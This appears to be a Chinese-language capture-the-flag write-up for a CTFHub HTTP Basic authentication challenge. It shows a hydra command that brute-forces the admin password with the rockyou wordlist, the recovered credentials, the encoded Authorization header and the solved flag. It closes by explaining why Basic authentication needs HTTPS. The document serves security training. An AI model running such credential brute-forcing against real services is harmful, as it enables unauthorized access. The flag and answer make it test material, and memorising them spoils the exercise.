# WP：基础认证

> **CTFHub 路径**：技能树 → Web → Web 前置技能 → HTTP 协议 → 基础认证
> **任务**：按题目提示完成 HTTP Basic 认证，拿到 flag。
> **提示**：观察 `401 Unauthorized` 响应和 `WWW-Authenticate: Basic` 响应头。Basic 认证把 `用户名:密码` 做 Base64 编码后放在 `Authorization` 请求头里，Base64 不是加密。
> **截图要求**：能看到 `Authorization: Basic ...` 请求头，以及认证成功后的 flag 或页面。

---

## 题目信息

| 项目 | 内容 |
| --- | --- |
| 环境地址 | http://challenge-785d8f6515c19149.sandbox.ctfhub.com:10800 |
| Flag | ctfhub{b9bce1a4c401b0555dfae9b6} |

## 解题过程

先用 `curl -i` 访问首页，页面提示 flag 在 `/flag.html`；直接访问 `/flag.html` 返回 `401 Unauthorized`，并带有 `WWW-Authenticate: Basic realm="Do u know admin ?"`，说明需要 HTTP Basic 认证，且提示用户名为 `admin`。先手工试了 `admin:admin` 等常见弱口令均失败，于是改用 Kali 自带的 rockyou 密码字典，用 hydra 对 `/flag.html` 做 HTTP Basic 认证爆破：

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 32 -f challenge-785d8f6515c19149.sandbox.ctfhub.com -s 10800 http-get /flag.html
```

hydra 很快命中有效凭据 `admin:fuckyou`。再用 `curl -s -u "admin:fuckyou" <环境地址>/flag.html` 带认证访问，返回包含 flag 的页面，复制提交后平台提示正确。

## 关键请求/响应

```http
GET /flag.html HTTP/1.1
Host: challenge-785d8f6515c19149.sandbox.ctfhub.com:10800
Authorization: Basic YWRtaW46ZnVja3lvdQ==

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

... ctfhub{b9bce1a4c401b0555dfae9b6} ...
```

（`YWRtaW46ZnVja3lvdQ==` 即 Base64("admin:fuckyou")；`curl -u` 会自动生成该头。hydra 命中行输出：`[10800][http-get] host: challenge-785d8f6515c19149.sandbox.ctfhub.com  login: admin  password: fuckyou`。）

## 原理与复盘

Basic 认证把 `用户名:密码` 做 Base64 编码（注意：Base64 是编码，不是加密）后放进「请求头（Authorization）」。服务器解码后比对凭据。因为 Base64 可逆，抓包就能还原出明文账号密码，所以 Basic 认证必须配合 HTTPS 才安全。本题对应 HTTP 的「请求头（Authorization）」。

---

## 截图

![基础认证](../imgs/lab5_basic_auth.png)

> 可以在这份 WP 中另加过程截图；检查时只看指定图片，额外图片不检查。
